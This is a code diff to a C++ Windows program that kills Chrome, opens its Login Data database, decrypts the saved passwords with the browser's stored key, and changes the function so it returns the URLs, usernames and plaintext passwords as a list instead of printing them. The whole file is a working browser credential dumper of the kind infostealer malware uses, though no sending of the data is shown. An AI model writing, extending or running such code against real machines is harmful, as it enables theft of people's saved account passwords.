@@ -1,9 +1,12 @@
 #include "chrome.hxx"
 
 #include "crypt.hxx"
+#include "login.hxx"
 #include "nowide.hxx"
-#include <iostream>
+#include <chrono>
 #include <fstream>
+#include <iostream>
+#include <string>
 #include <ShlObj.h>
 #include <windows.h>
 #include <tlhelp32.h>
@@ -40,7 +43,7 @@ std::filesystem::path chrome::get_base_path(void) {
     return base_path / "Google" / "Chrome" / "User Data";
 }
 
-void chrome::get(void) {
+std::vector<login> chrome::get(void) {
     // can't open database if chrome is running
     kill();
 
@@ -54,7 +57,7 @@ void chrome::get(void) {
         key_data = b64_decode(&key_data_b64[0]);
     } catch (json::exception &) {
         std::cerr << "json exception\n";
-        return;
+        return {};
     }
 
     key_data.erase(key_data.begin(), key_data.begin() + 5);
@@ -68,16 +71,18 @@ void chrome::get(void) {
     unique_sqlite3 db;
     if (sqlite3_open(m_logins_path.string().c_str(), &db) != SQLITE_OK) {
         std::cerr << "error opening databse\n";
-        return;
+        return {};
     }
 
     unique_sqlite3_stmt statement;
     if (sqlite3_prepare_v2(db.get(),
-            "SELECT action_url, date_created, username_value, password_value FROM logins",
+            "SELECT origin_url, date_created, username_value, password_value FROM logins",
             -1, &statement, NULL) != SQLITE_OK) {
         std::cerr << "error preparing statement\n";
-        return;
+        return {};
     }
+
+    std::vector<login> logins;
 
     ULONG bytes_copied;
     BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
@@ -85,16 +90,15 @@ void chrome::get(void) {
 
     int step_ret = 0;
     while ((step_ret = sqlite3_step(statement.get())) == SQLITE_ROW) {
-        std::string action_url = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 0));
-        std::string date_created = format_time(sqlite3_column_int64(statement.get(), 1));
-        std::string username_value = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 2));
-
-        const uint8_t *password_value = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement.get(), 3));
-        const size_t password_value_size = sqlite3_column_bytes(statement.get(), 3);
+        const std::string   db_origin_url = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 0));
+        const sqlite3_int64 db_date_created = sqlite3_column_int64(statement.get(), 1);
+        const std::string   db_username_value = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 2));
+        const uint8_t      *db_password_value = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement.get(), 3));
+        const size_t        db_password_value_size = sqlite3_column_bytes(statement.get(), 3);
 
         // first 3 bytes of password_value are kEncryptionVersionPrefix ("v10")
-        std::vector<uint8_t> nonce(password_value + 3, password_value + 15),
-                             ciphertext(password_value + 15, password_value + password_value_size);
+        std::vector<uint8_t> nonce(db_password_value + 3, db_password_value + 15),
+                             ciphertext(db_password_value + 15, db_password_value + db_password_value_size);
 
         std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
 
@@ -116,15 +120,25 @@ void chrome::get(void) {
                 0);
         password_plaintext.resize(password_plaintext.size() - 16);
 
-        std::cout << "action_url: " << action_url << "\n"
-                  << "date_created: " << date_created << "\n"
-                  << "username_value: " << username_value << "\n"
-                  << "password: " << password_plaintext << "\n\n";
+        // difference between UNIX epoch (1970-01-01 00:00:00 UTC) and windows FILETIME
+        // epoch (1601-01-01 00:00:00 UTC)
+        auto epoch_offset = std::chrono::seconds{11644473600LL};
+        std::chrono::system_clock::time_point date_created{std::chrono::microseconds{db_date_created}
+                                                           - epoch_offset};
+
+        login l;
+        l.url = db_origin_url;
+        l.username = db_username_value;
+        l.password = password_plaintext;
+        l.date_created = date_created;
+        logins.emplace_back(l);
     }
     if (step_ret != SQLITE_DONE) {
         std::cerr << "error reading database\n";
-        return;
+        return {};
     }
+
+    return logins;
 }
 
 void chrome::kill(void) const {
@@ -144,6 +158,7 @@ void chrome::kill(void) const {
     } while (Process32NextW(snapshot.get(), &entry));
 }
 
+/*
 std::string chrome::format_time(sqlite3_int64 t) {
     // time since epoch is stored by chrome as microseconds but by FILETIME as 100-nanosecond intervals
     // https://docs.microsoft.com/en-us/windows/win32/sysinfo/file-times
@@ -164,3 +179,4 @@ std::string chrome::format_time(sqlite3_int64 t) {
     std::sprintf(&ret[0], format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
     return ret;
 }
+*/
